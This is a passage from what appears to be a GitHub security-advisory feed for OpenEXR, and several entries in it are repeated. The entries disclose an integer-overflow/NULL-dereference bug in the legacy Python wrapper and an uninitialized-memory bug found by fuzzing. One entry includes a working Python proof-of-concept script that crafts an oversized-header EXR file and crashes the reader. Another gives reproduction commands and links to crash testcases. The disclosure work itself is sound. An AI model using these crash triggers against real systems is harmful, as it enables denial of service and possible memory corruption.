<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-57cw-j6vp-2p9m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64183">https://nvd.nist.gov/vuln/detail/CVE-2025-64183</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L109-L115</a></li>
<li><a href="https://github.com/advisories/GHSA-57cw-j6vp-2p9m">https://github.com/advisories/GHSA-57cw-j6vp-2p9m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-57cw-j6vp-2p9m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has buffer overflow in PyOpenEXR_old's channels() and channel()]]></title>
        <id>https://github.com/advisories/GHSA-vh63-9mqx-wmjr</id>
        <link href="https://github.com/advisories/GHSA-vh63-9mqx-wmjr"/>
        <updated>2026-04-06T17:51:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A memory safety bug in the legacy OpenEXR Python adapter (the deprecated OpenEXR.InputFile wrapper) allow crashes and likely code execution when opening attacker-controlled EXR files or when passing crafted Python objects.</p>
<p>Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit).</p>
<p>This bug was found with <a href="https://zeropath.com/?utm_source=joshua.hu">ZeroPath</a>.</p>
<h3 id="details">Details</h3>
<p>Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit), around <a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536">here</a>.</p>
<ul>
<li><p>In <code>channel()</code>:</p>
<ul>
<li><p>Width and height are derived from the header dataWindow using <code>int</code>.</p>
</li>
<li><p><code>typeSize</code> is a <code>size_t</code>. The buffer size is computed as <code>typeSize * width * height</code> with no bounds checks.</p>
</li>
<li><p>The result is passed to <code>PyString_FromStringAndSize(NULL, size)</code> which maps to <code>PyBytes_FromStringAndSize</code>. That function expects <code>Py_ssize_t</code>. If the product overflows or exceeds <code>PY_SSIZE_T_MAX</code>, allocation fails or the value wraps.</p>
</li>
<li><p>The return value is not checked. The code immediately calls <code>PyString_AsString(r)</code> and proceeds to build a <code>FrameBuffer</code> and calls <code>readPixels(miny, maxy)</code>.</p>
</li>
<li><p>On 64 bit: <code>PyBytes_FromStringAndSize</code> returns NULL, the wrapper dereferences NULL and crashes.<br>On 32 bit: the multiplication can wrap to a small positive size, producing a too-small allocation, after which <code>readPixels</code> writes <code>typeSize * width</code> bytes per scanline for <code>height</code> lines into that buffer, causing a heap overflow.</p>
</li>
</ul>
</li>
<li><p>In <code>channels()</code> the same pattern appears for each requested channel. It also ignores per-channel subsampling when computing the allocation and when inserting the <code>Slice</code> it hardcodes <code>xSampling=1, ySampling=1</code>. If a file actually has subsampled channels this makes the stride and allocation inconsistent, which can also lead to over or under writes.</p>
</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># write_big_header_then_crash.py
import OpenEXR, Imath

# OpenEXR sanity clamp for header coords is about INT_MAX/2 - 1
INT_MAX = (1 &lt;&lt; 31) - 1
MAX_COORD = (INT_MAX // 2) - 1  # 1073741822

# Choose a scanline width that keeps row-bytes &lt; 2^31
# 400,000,000 * 4 bytes = ~1.6 GB per scanline, which many codecs accept
WIDTH = min(400_000_000, MAX_COORD + 1)   # pixels
HEIGHT = 64                                # small height keeps the file tiny

# Build windows from pixel counts
dw = Imath.Box2i(Imath.V2i(0, 0), Imath.V2i(WIDTH - 1, HEIGHT - 1))

# Robustly set NO_COMPRESSION across enum naming differences
def no_compression():
    # Try common names, else fallback to numeric 0
    C = Imath.Compression
    for name in ("NO_COMPRESSION", "NONE", "NO_COMPRESSION_ENUM"):
        if hasattr(C, name):
            return Imath.Compression(getattr(C, name))
    return Imath.Compression(0)

hdr = {
    "dataWindow": dw,
    "displayWindow": dw,
    "channels": {"R": Imath.Channel(Imath.PixelType(Imath.PixelType.FLOAT))},
    "compression": no_compression(),
    "lineOrder": Imath.LineOrder(Imath.LineOrder.INCREASING_Y),
}

# Write just the header (no pixels)
out = OpenEXR.OutputFile("big_header.exr", hdr)
out.close()

# Now trigger the legacy bug: huge allocation request returns NULL, code fails to check
f = OpenEXR.InputFile("big_header.exr")
print("Triggering crash...")
f.channels(["R"])
</code></pre>
<pre><code>$ python3 poc.py 
Triggering crash...
libc++abi: terminating due to uncaught exception of type Iex_3_4::InputExc: Unable to query scanline information
Abort trap: 6              python3 poc.py
</code></pre>
<h3 id="impact">Impact</h3>
<p>Typical memory stuff.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64182">https://nvd.nist.gov/vuln/detail/CVE-2025-64182</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536</a></li>
<li><a href="https://github.com/advisories/GHSA-vh63-9mqx-wmjr">https://github.com/advisories/GHSA-vh63-9mqx-wmjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vh63-9mqx-wmjr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has buffer overflow in PyOpenEXR_old's channels() and channel()]]></title>
        <id>https://github.com/advisories/GHSA-vh63-9mqx-wmjr</id>
        <link href="https://github.com/advisories/GHSA-vh63-9mqx-wmjr"/>
        <updated>2026-04-06T17:51:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A memory safety bug in the legacy OpenEXR Python adapter (the deprecated OpenEXR.InputFile wrapper) allow crashes and likely code execution when opening attacker-controlled EXR files or when passing crafted Python objects.</p>
<p>Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit).</p>
<p>This bug was found with <a href="https://zeropath.com/?utm_source=joshua.hu">ZeroPath</a>.</p>
<h3 id="details">Details</h3>
<p>Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit), around <a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536">here</a>.</p>
<ul>
<li><p>In <code>channel()</code>:</p>
<ul>
<li><p>Width and height are derived from the header dataWindow using <code>int</code>.</p>
</li>
<li><p><code>typeSize</code> is a <code>size_t</code>. The buffer size is computed as <code>typeSize * width * height</code> with no bounds checks.</p>
</li>
<li><p>The result is passed to <code>PyString_FromStringAndSize(NULL, size)</code> which maps to <code>PyBytes_FromStringAndSize</code>. That function expects <code>Py_ssize_t</code>. If the product overflows or exceeds <code>PY_SSIZE_T_MAX</code>, allocation fails or the value wraps.</p>
</li>
<li><p>The return value is not checked. The code immediately calls <code>PyString_AsString(r)</code> and proceeds to build a <code>FrameBuffer</code> and calls <code>readPixels(miny, maxy)</code>.</p>
</li>
<li><p>On 64 bit: <code>PyBytes_FromStringAndSize</code> returns NULL, the wrapper dereferences NULL and crashes.<br>On 32 bit: the multiplication can wrap to a small positive size, producing a too-small allocation, after which <code>readPixels</code> writes <code>typeSize * width</code> bytes per scanline for <code>height</code> lines into that buffer, causing a heap overflow.</p>
</li>
</ul>
</li>
<li><p>In <code>channels()</code> the same pattern appears for each requested channel. It also ignores per-channel subsampling when computing the allocation and when inserting the <code>Slice</code> it hardcodes <code>xSampling=1, ySampling=1</code>. If a file actually has subsampled channels this makes the stride and allocation inconsistent, which can also lead to over or under writes.</p>
</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># write_big_header_then_crash.py
import OpenEXR, Imath

# OpenEXR sanity clamp for header coords is about INT_MAX/2 - 1
INT_MAX = (1 &lt;&lt; 31) - 1
MAX_COORD = (INT_MAX // 2) - 1  # 1073741822

# Choose a scanline width that keeps row-bytes &lt; 2^31
# 400,000,000 * 4 bytes = ~1.6 GB per scanline, which many codecs accept
WIDTH = min(400_000_000, MAX_COORD + 1)   # pixels
HEIGHT = 64                                # small height keeps the file tiny

# Build windows from pixel counts
dw = Imath.Box2i(Imath.V2i(0, 0), Imath.V2i(WIDTH - 1, HEIGHT - 1))

# Robustly set NO_COMPRESSION across enum naming differences
def no_compression():
    # Try common names, else fallback to numeric 0
    C = Imath.Compression
    for name in ("NO_COMPRESSION", "NONE", "NO_COMPRESSION_ENUM"):
        if hasattr(C, name):
            return Imath.Compression(getattr(C, name))
    return Imath.Compression(0)

hdr = {
    "dataWindow": dw,
    "displayWindow": dw,
    "channels": {"R": Imath.Channel(Imath.PixelType(Imath.PixelType.FLOAT))},
    "compression": no_compression(),
    "lineOrder": Imath.LineOrder(Imath.LineOrder.INCREASING_Y),
}

# Write just the header (no pixels)
out = OpenEXR.OutputFile("big_header.exr", hdr)
out.close()

# Now trigger the legacy bug: huge allocation request returns NULL, code fails to check
f = OpenEXR.InputFile("big_header.exr")
print("Triggering crash...")
f.channels(["R"])
</code></pre>
<pre><code>$ python3 poc.py 
Triggering crash...
libc++abi: terminating due to uncaught exception of type Iex_3_4::InputExc: Unable to query scanline information
Abort trap: 6              python3 poc.py
</code></pre>
<h3 id="impact">Impact</h3>
<p>Typical memory stuff.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64182">https://nvd.nist.gov/vuln/detail/CVE-2025-64182</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536</a></li>
<li><a href="https://github.com/advisories/GHSA-vh63-9mqx-wmjr">https://github.com/advisories/GHSA-vh63-9mqx-wmjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vh63-9mqx-wmjr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR has buffer overflow in PyOpenEXR_old's channels() and channel()]]></title>
        <id>https://github.com/advisories/GHSA-vh63-9mqx-wmjr</id>
        <link href="https://github.com/advisories/GHSA-vh63-9mqx-wmjr"/>
        <updated>2026-04-06T17:51:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A memory safety bug in the legacy OpenEXR Python adapter (the deprecated OpenEXR.InputFile wrapper) allow crashes and likely code execution when opening attacker-controlled EXR files or when passing crafted Python objects.</p>
<p>Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit).</p>
<p>This bug was found with <a href="https://zeropath.com/?utm_source=joshua.hu">ZeroPath</a>.</p>
<h3 id="details">Details</h3>
<p>Integer overflow and unchecked allocation in InputFile.channel() and InputFile.channels() can lead to heap overflow (32 bit) or a NULL deref (64 bit), around <a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536">here</a>.</p>
<ul>
<li><p>In <code>channel()</code>:</p>
<ul>
<li><p>Width and height are derived from the header dataWindow using <code>int</code>.</p>
</li>
<li><p><code>typeSize</code> is a <code>size_t</code>. The buffer size is computed as <code>typeSize * width * height</code> with no bounds checks.</p>
</li>
<li><p>The result is passed to <code>PyString_FromStringAndSize(NULL, size)</code> which maps to <code>PyBytes_FromStringAndSize</code>. That function expects <code>Py_ssize_t</code>. If the product overflows or exceeds <code>PY_SSIZE_T_MAX</code>, allocation fails or the value wraps.</p>
</li>
<li><p>The return value is not checked. The code immediately calls <code>PyString_AsString(r)</code> and proceeds to build a <code>FrameBuffer</code> and calls <code>readPixels(miny, maxy)</code>.</p>
</li>
<li><p>On 64 bit: <code>PyBytes_FromStringAndSize</code> returns NULL, the wrapper dereferences NULL and crashes.<br>On 32 bit: the multiplication can wrap to a small positive size, producing a too-small allocation, after which <code>readPixels</code> writes <code>typeSize * width</code> bytes per scanline for <code>height</code> lines into that buffer, causing a heap overflow.</p>
</li>
</ul>
</li>
<li><p>In <code>channels()</code> the same pattern appears for each requested channel. It also ignores per-channel subsampling when computing the allocation and when inserting the <code>Slice</code> it hardcodes <code>xSampling=1, ySampling=1</code>. If a file actually has subsampled channels this makes the stride and allocation inconsistent, which can also lead to over or under writes.</p>
</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># write_big_header_then_crash.py
import OpenEXR, Imath

# OpenEXR sanity clamp for header coords is about INT_MAX/2 - 1
INT_MAX = (1 &lt;&lt; 31) - 1
MAX_COORD = (INT_MAX // 2) - 1  # 1073741822

# Choose a scanline width that keeps row-bytes &lt; 2^31
# 400,000,000 * 4 bytes = ~1.6 GB per scanline, which many codecs accept
WIDTH = min(400_000_000, MAX_COORD + 1)   # pixels
HEIGHT = 64                                # small height keeps the file tiny

# Build windows from pixel counts
dw = Imath.Box2i(Imath.V2i(0, 0), Imath.V2i(WIDTH - 1, HEIGHT - 1))

# Robustly set NO_COMPRESSION across enum naming differences
def no_compression():
    # Try common names, else fallback to numeric 0
    C = Imath.Compression
    for name in ("NO_COMPRESSION", "NONE", "NO_COMPRESSION_ENUM"):
        if hasattr(C, name):
            return Imath.Compression(getattr(C, name))
    return Imath.Compression(0)

hdr = {
    "dataWindow": dw,
    "displayWindow": dw,
    "channels": {"R": Imath.Channel(Imath.PixelType(Imath.PixelType.FLOAT))},
    "compression": no_compression(),
    "lineOrder": Imath.LineOrder(Imath.LineOrder.INCREASING_Y),
}

# Write just the header (no pixels)
out = OpenEXR.OutputFile("big_header.exr", hdr)
out.close()

# Now trigger the legacy bug: huge allocation request returns NULL, code fails to check
f = OpenEXR.InputFile("big_header.exr")
print("Triggering crash...")
f.channels(["R"])
</code></pre>
<pre><code>$ python3 poc.py 
Triggering crash...
libc++abi: terminating due to uncaught exception of type Iex_3_4::InputExc: Unable to query scanline information
Abort trap: 6              python3 poc.py
</code></pre>
<h3 id="impact">Impact</h3>
<p>Typical memory stuff.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-vh63-9mqx-wmjr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64182">https://nvd.nist.gov/vuln/detail/CVE-2025-64182</a></li>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536">https://github.com/AcademySoftwareFoundation/openexr/blob/b3a19903db0672c63055023aa788e592b16ec3c5/src/wrappers/python/PyOpenEXR_old.cpp#L528-L536</a></li>
<li><a href="https://github.com/advisories/GHSA-vh63-9mqx-wmjr">https://github.com/advisories/GHSA-vh63-9mqx-wmjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vh63-9mqx-wmjr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-06T17:51:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR Makes Use of Uninitialized Memory]]></title>
        <id>https://github.com/advisories/GHSA-3h9h-qfvw-98hq</id>
        <link href="https://github.com/advisories/GHSA-3h9h-qfvw-98hq"/>
        <updated>2026-04-06T17:51:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>While fuzzing <code>openexr_exrcheck_fuzzer</code>, Valgrind reports a conditional branch depending on uninitialized data inside <code>generic_unpack</code>. This indicates a use of uninitialized memory (CWE-457). The issue is reproducible with the current OSS-Fuzz harness and a single-file PoC.</p>
<h3 id="details">Details</h3>
<p><strong>Environment:</strong></p>
<ul>
<li>Tooling: <code>valgrind --tool=memcheck --track-origins=yes</code></li>
<li>Target: <code>openexr_exrcheck_fuzzer</code></li>
<li>OS: Ubuntu 20.04.6 LTS focal x86_64</li>
<li>openexr version and Git-commit hash: <code> openexr 3.4.2 | commit fd657e8a41e157e5841c7cc2e2a5efe094b069a1 (grafted, HEAD -&gt; main, origin/main, origin/HEAD)</code></li>
</ul>
<p>Function: <code>generic_unpack</code></p>
<p>Possible root cause (based on observed symptoms):
The unpacker is branching on bytes in a scratch buffer that were never written because the decode step didn’t fully populate it.</p>
<ul>
<li>The first use flagged is in <code>generic_unpack()</code>. That function reads from the decompressed/expanded pixel buffer to scatter data into the framebuffer. A “conditional jump depends on uninitialised value(s)” means it’s consulting bytes in that buffer before they were written.</li>
<li>Valgrind says the uninitialised value “was created by a heap allocation (malloc)”, not the stack: this matches a per-tile/per-scanline decode scratch buffer allocated in <code>exr_decoding_run()</code>.</li>
</ul>
<p><strong>Valgrind Trace (top frames):</strong></p>
<pre><code class="language-bash">==454== Conditional jump or move depends on uninitialised value(s)
==454==    at 0x4539BE: generic_unpack (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x44B85F: exr_decoding_run (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x38BC5F: Imf_4_0::(anonymous namespace)::TileProcess::run_decode(_priv_exr_context_t const*, int, Imf_4_0::FrameBuffer const*, std::__1::vector&lt;Imf_4_0::Slice, std::__1::allocator&lt;Imf_4_0::Slice&gt; &gt; const&amp;) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x388BE1: Imf_4_0::TiledInputFile::Data::readTiles(int, int, int, int, int, int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x388619: Imf_4_0::TiledInputFile::readTiles(int, int, int, int, int, int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x353755: Imf_4_0::InputFile::Data::bufferedReadPixels(int, int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x352286: Imf_4_0::InputFile::readPixels(int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x3190FA: Imf_4_0::(anonymous namespace)::readMultiPart(Imf_4_0::MultiPartInputFile&amp;, bool, bool) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x314C4D: Imf_4_0::checkOpenEXRFile(char const*, unsigned long, bool, bool, bool) (in /out/openexr_exrcheck_fuzzer)
==454==  Uninitialised value was created by a heap allocation at 0x483B7F3: malloc (in /usr/lib/x86_64-linux-gnu/valgrind/vgpreload_memcheck-amd64-linux.so)
</code></pre>
<h3 id="poc">PoC</h3>
<p>In the attached archive, you will find:</p>
<ul>
<li>The executable used for our tests.</li>
<li>The testcase used to trigger the bug.</li>
</ul>
<p>To observe the bug, simply run the OSS-Fuzz helper script:</p>
<pre><code class="language-bash">git clone https://github.com/google/oss-fuzz.git
cd oss-fuzz

python3 infra/helper.py build_image openexr
python3 infra/helper.py build_fuzzers --sanitizer=none openexr
python3 infra/helper.py shell openexr

apt update &amp;&amp; apt install -y valgrind
ulimit -n 65535
valgrind --tool=memcheck --track-origins=yes /out/openexr_exrcheck_fuzzer /path/to/poc
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Undefined Behavior</li>
<li>Potential crash</li>
<li>Denial of Service</li>
</ul>
<p><strong>Credit:</strong> Aldo Ristori
<a href="https://github.com/user-attachments/files/23024726/archive0.zip">archive0.zip</a></p>
<h3 id="update-note">Update Note:</h3>
<p>Other saved testcases from the fuzzing campaign trigger the same underlying bug, but with a different manifestation. So there is one root cause (missing post-decode validation / zero-init before any unpack), with different call-sites. Below there are several archives, formatted like the previous one, that reproduce the other test cases.</p>
<p><strong>Other observed sinks (distinct manifestations of the same bug):</strong></p>
<p><strong>Deep pointers path:</strong>
generic_unpack_deep_pointers (deep scanline/tiled)
<a href="https://github.com/user-attachments/files/23024736/archive1.zip">archive1.zip</a></p>
<p><strong>Deep sample table path:</strong>
unpack_sample_table (deep scanline)
<a href="https://github.com/user-attachments/files/23024740/archive2.zip">archive2.zip</a></p>
<p><strong>Half conversion path:</strong>
half_to_float_buffer_f16c via unpack_half_to_float_3chan_planar
<a href="https://github.com/user-attachments/files/23024744/archive3.zip">archive3.zip</a></p>
<p><strong>Deep compositing:</strong>
CompositeDeepScanLine::readPixels → ThreadPool::addTask → LineCompositeTask::execute
<a href="https://github.com/user-attachments/files/23024746/archive4.zip">archive4.zip</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-3h9h-qfvw-98hq">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-3h9h-qfvw-98hq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64181">https://nvd.nist.gov/vuln/detail/CVE-2025-64181</a></li>
<li><a href="https://github.com/user-attachments/files/23024726/archive0.zip">https://github.com/user-attachments/files/23024726/archive0.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024736/archive1.zip">https://github.com/user-attachments/files/23024736/archive1.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024740/archive2.zip">https://github.com/user-attachments/files/23024740/archive2.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024744/archive3.zip">https://github.com/user-attachments/files/23024744/archive3.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024746/archive4.zip">https://github.com/user-attachments/files/23024746/archive4.zip</a></li>
<li><a href="https://github.com/advisories/GHSA-3h9h-qfvw-98hq">https://github.com/advisories/GHSA-3h9h-qfvw-98hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h9h-qfvw-98hq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-04-06T17:51:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[OpenEXR] OpenEXR Makes Use of Uninitialized Memory]]></title>
        <id>https://github.com/advisories/GHSA-3h9h-qfvw-98hq</id>
        <link href="https://github.com/advisories/GHSA-3h9h-qfvw-98hq"/>
        <updated>2026-04-06T17:51:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>While fuzzing <code>openexr_exrcheck_fuzzer</code>, Valgrind reports a conditional branch depending on uninitialized data inside <code>generic_unpack</code>. This indicates a use of uninitialized memory (CWE-457). The issue is reproducible with the current OSS-Fuzz harness and a single-file PoC.</p>
<h3 id="details">Details</h3>
<p><strong>Environment:</strong></p>
<ul>
<li>Tooling: <code>valgrind --tool=memcheck --track-origins=yes</code></li>
<li>Target: <code>openexr_exrcheck_fuzzer</code></li>
<li>OS: Ubuntu 20.04.6 LTS focal x86_64</li>
<li>openexr version and Git-commit hash: <code> openexr 3.4.2 | commit fd657e8a41e157e5841c7cc2e2a5efe094b069a1 (grafted, HEAD -&gt; main, origin/main, origin/HEAD)</code></li>
</ul>
<p>Function: <code>generic_unpack</code></p>
<p>Possible root cause (based on observed symptoms):
The unpacker is branching on bytes in a scratch buffer that were never written because the decode step didn’t fully populate it.</p>
<ul>
<li>The first use flagged is in <code>generic_unpack()</code>. That function reads from the decompressed/expanded pixel buffer to scatter data into the framebuffer. A “conditional jump depends on uninitialised value(s)” means it’s consulting bytes in that buffer before they were written.</li>
<li>Valgrind says the uninitialised value “was created by a heap allocation (malloc)”, not the stack: this matches a per-tile/per-scanline decode scratch buffer allocated in <code>exr_decoding_run()</code>.</li>
</ul>
<p><strong>Valgrind Trace (top frames):</strong></p>
<pre><code class="language-bash">==454== Conditional jump or move depends on uninitialised value(s)
==454==    at 0x4539BE: generic_unpack (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x44B85F: exr_decoding_run (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x38BC5F: Imf_4_0::(anonymous namespace)::TileProcess::run_decode(_priv_exr_context_t const*, int, Imf_4_0::FrameBuffer const*, std::__1::vector&lt;Imf_4_0::Slice, std::__1::allocator&lt;Imf_4_0::Slice&gt; &gt; const&amp;) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x388BE1: Imf_4_0::TiledInputFile::Data::readTiles(int, int, int, int, int, int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x388619: Imf_4_0::TiledInputFile::readTiles(int, int, int, int, int, int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x353755: Imf_4_0::InputFile::Data::bufferedReadPixels(int, int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x352286: Imf_4_0::InputFile::readPixels(int) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x3190FA: Imf_4_0::(anonymous namespace)::readMultiPart(Imf_4_0::MultiPartInputFile&amp;, bool, bool) (in /out/openexr_exrcheck_fuzzer)
==454==    by 0x314C4D: Imf_4_0::checkOpenEXRFile(char const*, unsigned long, bool, bool, bool) (in /out/openexr_exrcheck_fuzzer)
==454==  Uninitialised value was created by a heap allocation at 0x483B7F3: malloc (in /usr/lib/x86_64-linux-gnu/valgrind/vgpreload_memcheck-amd64-linux.so)
</code></pre>
<h3 id="poc">PoC</h3>
<p>In the attached archive, you will find:</p>
<ul>
<li>The executable used for our tests.</li>
<li>The testcase used to trigger the bug.</li>
</ul>
<p>To observe the bug, simply run the OSS-Fuzz helper script:</p>
<pre><code class="language-bash">git clone https://github.com/google/oss-fuzz.git
cd oss-fuzz

python3 infra/helper.py build_image openexr
python3 infra/helper.py build_fuzzers --sanitizer=none openexr
python3 infra/helper.py shell openexr

apt update &amp;&amp; apt install -y valgrind
ulimit -n 65535
valgrind --tool=memcheck --track-origins=yes /out/openexr_exrcheck_fuzzer /path/to/poc
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li>Undefined Behavior</li>
<li>Potential crash</li>
<li>Denial of Service</li>
</ul>
<p><strong>Credit:</strong> Aldo Ristori
<a href="https://github.com/user-attachments/files/23024726/archive0.zip">archive0.zip</a></p>
<h3 id="update-note">Update Note:</h3>
<p>Other saved testcases from the fuzzing campaign trigger the same underlying bug, but with a different manifestation. So there is one root cause (missing post-decode validation / zero-init before any unpack), with different call-sites. Below there are several archives, formatted like the previous one, that reproduce the other test cases.</p>
<p><strong>Other observed sinks (distinct manifestations of the same bug):</strong></p>
<p><strong>Deep pointers path:</strong>
generic_unpack_deep_pointers (deep scanline/tiled)
<a href="https://github.com/user-attachments/files/23024736/archive1.zip">archive1.zip</a></p>
<p><strong>Deep sample table path:</strong>
unpack_sample_table (deep scanline)
<a href="https://github.com/user-attachments/files/23024740/archive2.zip">archive2.zip</a></p>
<p><strong>Half conversion path:</strong>
half_to_float_buffer_f16c via unpack_half_to_float_3chan_planar
<a href="https://github.com/user-attachments/files/23024744/archive3.zip">archive3.zip</a></p>
<p><strong>Deep compositing:</strong>
CompositeDeepScanLine::readPixels → ThreadPool::addTask → LineCompositeTask::execute
<a href="https://github.com/user-attachments/files/23024746/archive4.zip">archive4.zip</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-3h9h-qfvw-98hq">https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-3h9h-qfvw-98hq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64181">https://nvd.nist.gov/vuln/detail/CVE-2025-64181</a></li>
<li><a href="https://github.com/user-attachments/files/23024726/archive0.zip">https://github.com/user-attachments/files/23024726/archive0.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024736/archive1.zip">https://github.com/user-attachments/files/23024736/archive1.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024740/archive2.zip">https://github.com/user-attachments/files/23024740/archive2.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024744/archive3.zip">https://github.com/user-attachments/files/23024744/archive3.zip</a></li>
<li><a href="https://github.com/user-attachments/files/23024746/archive4.zip">https://github.com/user-attachments/files/23024746/archive4.zip</a></li>
<li><a href="https://github.com/advisories/GHSA-3h9h-qfvw-98hq">https://github.com/advisories/GHSA-3h9h-qfvw-98hq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
